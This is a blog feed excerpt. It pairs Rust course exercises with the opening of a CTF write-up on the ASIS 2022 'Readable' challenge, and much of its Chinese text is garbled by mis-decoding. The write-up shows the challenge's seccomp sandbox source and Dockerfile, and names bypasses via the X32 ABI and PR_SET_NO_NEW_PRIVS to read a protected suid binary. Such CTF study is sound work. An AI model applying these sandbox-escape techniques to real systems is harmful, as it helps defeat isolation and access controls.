line gets displayed:</span><br>        io::<span class="hljs-title function_ invoke__">stdout</span>().<span class="hljs-title function_ invoke__">flush</span>().<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Error flushing stdout.&quot;</span>);<br>        <span class="hljs-comment">// Read a letter</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">guess</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();<br>        io::<span class="hljs-title function_ invoke__">stdin</span>()<br>            .<span class="hljs-title function_ invoke__">read_line</span>(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Error reading line.&quot;</span>);<br>        <span class="hljs-comment">// Remain only-first-char string</span><br>        guess.<span class="hljs-title function_ invoke__">truncate</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">guess_right</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..secret_word.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>            <span class="hljs-keyword">if</span> guess.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">nth</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">unwrap</span>() == secret_word_chars[i] &#123;<br>                now_guesss.<span class="hljs-title function_ invoke__">replace_range</span>(i..i + <span class="hljs-number">1</span>, &amp;guess);<br>                r_cnt += <span class="hljs-number">1</span>;<br>                guess_right = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> !guess_right &#123;<br>            l_cnt -= <span class="hljs-number">1</span>;<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">if</span> r_cnt == length &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;Congratulations! You have guessed the correct word &#123;&#125;!&quot;</span>,<br>            secret_word<br>        );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Sorry. The correct word is &#123;&#125;!&quot;</span>, secret_word);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo run<br>    Finished dev [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.01s<br>     Running `target/debug/hangman`<br>Welcome to CS110L Hangman!<br>The word so far is ------<br>You have 5 guesses left<br>Please guess a letter: n<br>The word so far is n-----<br>You have 5 guesses left<br>Please guess a letter: i<br>The word so far is ni----<br>You have 5 guesses left<br>Please guess a letter: g<br>The word so far is nig---<br>You have 5 guesses left<br>Please guess a letter: t<br>The word so far is nig-t-<br>You have 5 guesses left<br>Please guess a letter: u<br>The word so far is nig-tu<br>You have 5 guesses left<br>Please guess a letter: h<br>Congratulations! You have guessed the correct word nightu!<br></code></pre></td></tr></table></figure><h1>Week 2 Exercises: Ownership and structs</h1><h2 id="Purpose-v2"><a class="header-anchor" href="#Purpose-v2">Â¶</a>Purpose</h2><ul><li>æ‰€æœ‰æƒ/å¼•ç”¨çš„ä¸€äº›ç»ƒä¹ </li><li>åˆæ­¥äº†è§£ Rust çš„é¢å‘å¯¹è±¡ç¼–ç¨‹</li></ul><h2 id="Part-1-Ownership-short-answer-exercises"><a class="header-anchor" href="#Part-1-Ownership-short-answer-exercises">Â¶</a>Part 1: Ownership short-answer exercises</h2><p>ä¸‹åˆ—ä»£ç èƒ½å¦æ­£å¸¸è¿è¡Œï¼Œä¸èƒ½è¯·ç®€ç­”åŸå› ã€‚</p><ul><li><p>Example 1:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;s;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref2</span> = &amp;ref1;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref3</span> = &amp;ref2;<br>    s = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, ref3.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€å±‚å¼•ç”¨å¥—ä¸€å±‚å¼•ç”¨çš„æ„Ÿè§‰éå¸¸ç„å­¦ï¼Œè¿™é‡Œå…ˆä»é˜²æ­¢æŠ¥é”™çš„æ€è·¯è¿›è¡Œç²—ç•¥çš„å­¦ä¹ ã€‚</p><p>é¦–å…ˆæŠŠ <code>s = String::from(&quot;goodbye&quot;);</code> åˆ äº†ï¼Œæˆ‘ä»¬å‘ç°ä»£ç å¯ä»¥æ­£ç¡®è¿è¡Œè€Œä¸”è¾“å‡ºäº† <code>HELLO</code>ã€‚è¯´æ˜è¿™ç§å¥—å¨ƒå¼•ç”¨æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: variable does not need to be mutable<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">2</span>:<span class="hljs-number">9</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>  |         ----^<br>  |         |<br>  |         help: remove this `<span class="hljs-keyword">mut</span>`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(unused_mut)]</span>` on by default<br><br>warning: `ownership` (bin <span class="hljs-string">&quot;ownership&quot;</span>) generated <span class="hljs-number">1</span> warning<br>    Finished dev [unoptimized + debuginfo] <span class="hljs-title function_ invoke__">target</span>(s) <span class="hljs-keyword">in</span> <span class="hljs-number">0.36</span>s<br>     Running `target/debug/ownership`<br>HELLO<br></code></pre></td></tr></table></figure><p>é‚£é—®é¢˜åº”è¯¥å‡ºåœ¨ï¼š ref1 ç­‰å·²ç» borrow äº† sï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹ s è¿›è¡Œä¿®æ”¹ä¼šå¯¼è‡´ s çš„é‡æ–°åˆ†é…ï¼Œå¯¼è‡´ ref1 ç­‰å¼•ç”¨æŒ‡å‘ä¸åˆæ³•çš„åŒºåŸŸã€‚</p><p>ä¸‹é¢çš„ä»£ç å¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;<span class="hljs-keyword">mut</span> s;<br>    *ref1 = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œä¸‹é¢çš„ä»£ç å°±ä¼šæŠ¥é”™ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref1</span> = &amp;<span class="hljs-keyword">mut</span> s;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref2</span> = &amp;ref1;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ref3</span> = &amp;ref2;<br>    *ref1 = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;goodbye&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, ref3.<span class="hljs-title function_ invoke__">to_uppercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Example 2:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">drip_drop</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello world!&quot;</span>);<br>    <span class="hljs-keyword">return</span> &amp;s;<br>&#125;<br></code></pre></td></tr></table></figure><p>s åœ¨å‡½æ•°ç»“æŸæ—¶ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè¯•å›¾è¿”å›ä¸€ä¸ªæ‚¬å‚æŒ‡é’ˆåœ¨ Rust é‡Œé¢æ˜¾ç„¶æ˜¯ä¸èƒ½é€šè¿‡ç¼–è¯‘çš„ã€‚</p></li><li><p>Example 3:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(s1);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: <span class="hljs-type">String</span> = v[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s2);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust">error[E0507]: cannot <span class="hljs-keyword">move</span> out of index of `<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">5</span>:<span class="hljs-number">22</span><br>  |<br><span class="hljs-number">5</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: <span class="hljs-type">String</span> = v[<span class="hljs-number">0</span>];<br>  |                      ^^^^<br>  |                      |<br>  |                      <span class="hljs-keyword">move</span> occurs because value has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br>  |                      help: consider borrowing here: `&amp;v[<span class="hljs-number">0</span>]`<br><br>For more information about this error, <span class="hljs-keyword">try</span> `rustc --explain E0507`.<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç é¦–å…ˆ s1 çš„æ‰€æœ‰æƒè¢«ä¼ ç»™äº† Vec v ï¼Œç„¶åè¯•å›¾ä» v ä¸­å–å‡º s1 æ—¶å‘ç”Ÿäº†æŠ¥é”™ï¼Œåº”è¯¥æ˜¯ä» v å–å‡ºæ—¶åšäº† Copy çš„æ“ä½œï¼Œè€Œ String ç±»å‹æ²¡æœ‰å®ç° Copy traitï¼Œåšå¦‚ä¸‹ä¿®æ”¹å¯å®Œæˆæºä»£ç åŠŸèƒ½ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(s1);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span>: &amp;<span class="hljs-type">String</span> = &amp;v[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s2);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ASIS CTF Quals 2022 Readable</title>
    <link href="/posts/66d9c745.html"/>
    <url>/posts/66d9c745.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>æºç å’Œæ–‡æ¡£æ‰æ˜¯çœŸ ğŸ‘´ğŸ»ï¼Œå…¶ä»–çš„éƒ½æ˜¯å‡æ»´ï¼Œå†°çº¢èŒ¶æ»´æ°´</p></blockquote><h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2><p>æœ€è¿‘å’Œ <a href="https://strawhat.team/">Strawhat</a> çš„å¸ˆå‚…ä»¬æ‰“äº† <code>ASIS 2022 Quals</code>ï¼Œé¢˜ç›®éƒ½æŒºä¸é”™çš„ã€‚</p><p>å…¶ä¸­æœ‰ä¿©é“æ˜¯ <code>scanf()</code> çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ <code>%0s</code> å®ç°æ ˆæº¢å‡ºå’Œåˆ©ç”¨ <code>%9$s</code> å®ç°æ ˆä¸Šä»»æ„è¯»å…¥ã€‚å¬èµ·æ¥è›®ç¦»è°±ï¼Œä½†æ˜¯ç±»æ¯” <code>printf()</code> ä¸€æƒ³è¿˜æ˜¯æŒºæ­£å¸¸çš„ 233ï¼ŒæŠ¢äº†ä¸ªä¸€è¡€ã€‚å†å°±æ˜¯æ¯”èµ›ä¸­èŠ±äº†è¾ƒå¤šæ—¶é—´åœ¨ä¸‹é¢è¿™é“ <code>readable</code> ä¸Šï¼Œæµ…æµ…è®°å½•ä¸€ä¸‹åšé¢˜çš„è¿‡ç¨‹ã€‚é¡ºå¸¦å¤ç°ä¸€ä¸‹æ²¡è§£å‡ºçš„ jsyã€‚</p><p>æŠŠé¢˜ç›®æ”¾åœ¨äº†<a href="https://drive.google.com/file/d/1fbELLJohPDD4giarKeKmQcvDnLpcAiDV/view?usp=sharing">è¿™é‡Œ</a>ï¼Œéœ€è¦çš„å¸ˆå‚…ä»¬å¯ä»¥ä¸‹è½½ XDã€‚</p><h2 id="Readable-10-solves"><a class="header-anchor" href="#Readable-10-solves">Â¶</a>Readable(10 solves)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016010034466.png" alt="image-20221016010034466"></p><p>readable</p><p>Yes, you can read <strong><code>suid</code></strong> executable with <strong><code>strace</code></strong>. but what if you donâ€™t have that?</p><p>Hint: <strong><a href="https://clubby789.me/zer0pts2022/#readflag">a might-be useful blogpost</a></strong>.</p><h3 id="çœæµ"><a class="header-anchor" href="#çœæµ">Â¶</a>çœæµ</h3><p><strong>Quesion:</strong> åœ¨ seccomp é™åˆ¶å’Œä¸€äº›å…¶ä»–çš„é™åˆ¶ä¸‹ï¼Œå»è·å¾—æƒé™ä¸º <code>111(x)</code>  å¸¦æœ‰ suid æƒé™çš„ readme ç¨‹åºä¸­çš„åŸæœ¬çš„ flagã€‚</p><p><strong>Answer:</strong> åˆ©ç”¨ <code>X32 ABI</code> ç»•è¿‡æˆ–è€… <code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code> æŠŠ SUID ğŸ‘ æ¨‚ ã€‚</p><h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº†ä¿©ä¸ªæºç æ–‡ä»¶ï¼š</p><ul><li><h4 id="readme-c"><a class="header-anchor" href="#readme-c">Â¶</a><strong>readme.c</strong></h4></li></ul><p>ç”¨æ¥è¾“å‡º flagï¼Œä½†æ˜¯æ¯æ¬¡ä¼šæŠŠ flag ğŸ‘ æˆå…¶ä»–çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *flag = <span class="hljs-string">&quot;ASIS&#123;test-flag&#125;&quot;</span>; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>flag = <span class="hljs-string">&quot;No flag for you&quot;</span>;<br><span class="hljs-built_in">puts</span>(flag);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="run-c"><a class="header-anchor" href="#run-c">Â¶</a><strong>run.c</strong></h4></li></ul><p>è®¾ç½®äº† seccompï¼ˆğŸ‘ æ‰äº† ptrace ç­‰ğŸ‘¨ğŸ»æ‰“ğŸ‘¦ğŸ»çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼ŒğŸ‘ æ‰äº† <code>/proc</code>ï¼Œæ›´æ”¹äº† uid å’Œ gid ä¸º <code>1000(pwn)</code>ï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬çš„ expã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_nr (offsetof(struct seccomp_data, nr))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> arch_nr (offsetof(struct seccomp_data, arch))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARCH_NR AUDIT_ARCH_X86_64</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VALIDATE_ARCHITECTURE                             \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),            \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXAMINE_SYSCALL BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DISALLOW_SYSCALL(name)                            \</span><br><span class="hljs-meta">  BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOW_SYSCALLS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">install_filter</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      VALIDATE_ARCHITECTURE,<br>      EXAMINE_SYSCALL,<br>      DISALLOW_SYSCALL(ptrace),<br>      DISALLOW_SYSCALL(process_vm_readv),<br>      DISALLOW_SYSCALL(process_vm_writev),<br>      ALLOW_SYSCALLS,<br>  &#125;;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>)(<span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>])),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="hljs-number">2</span>, &amp;prog)) &#123;<br>    perror(<span class="hljs-string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">char</span> **)</span> &#123;<br>  install_filter();<br>  <span class="hljs-keyword">if</span> (umount(<span class="hljs-string">&quot;/proc&quot;</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not umount procfs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (setgid(<span class="hljs-number">1000</span>) || setuid(<span class="hljs-number">1000</span>)) &#123;<br>    perror(<span class="hljs-string">&quot;could not drop privs&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-type">char</span> *args = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/tmp/exploit&quot;</span>,&amp;args,&amp;args);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/Untitled-1665855700180-4.png" alt="Untitled"></p><ul><li><strong>Dockerfile</strong></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/readme /home/pwn/readme</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./stuff/run /home/pwn/run</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root /home/pwn/*   </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /home/pwn/run; </span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 111 /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> u+s /home/pwn/readme;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd pwn;</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/home/pwn/run&quot;</span>];</span><br></code></pre></td></tr></table></figure><h3 id="æ€è€ƒ"><a class="header-anchor" href="#æ€è€ƒ">Â¶</a>æ€è€ƒ</h3><p>é¢˜ç›®æœ¬èº«è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œç»™äº† RCE çš„æœºä¼šï¼Œæƒ³åŠæ³•å»æ‹¿åˆ° flagã€‚</p><p>é¢˜ç›®æœ¬èº« Hint ç»™çš„é˜…è¯»ææ–™å…¶å®å¾ˆæœ‰ä»·å€¼ï¼Œé€šè¿‡é˜…è¯»æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä¸€ä¸‹çš„å‡ ä¸ªæ–¹æ³•ï¼š</p><ul><li>åˆ©ç”¨ /proc 